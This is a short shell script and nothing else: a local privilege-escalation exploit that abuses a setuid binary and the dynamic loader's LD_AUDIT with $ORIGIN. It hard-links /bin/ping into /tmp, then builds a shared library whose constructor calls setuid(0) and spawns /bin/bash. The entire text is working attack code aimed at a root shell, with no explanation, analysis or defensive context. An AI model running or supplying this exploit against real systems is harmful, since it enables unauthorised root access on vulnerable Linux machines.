mkdir /tmp/exploit
ln /bin/ping /tmp/exploit/target
exec 3< /tmp/exploit/target
rm -rf /tmp/exploit
cat >> /tmp/payload.c <<EOF
void __attribute__((constructor)) init()
{
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -w -fPIC -shared -o /tmp/exploit /tmp/payload.c
LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3

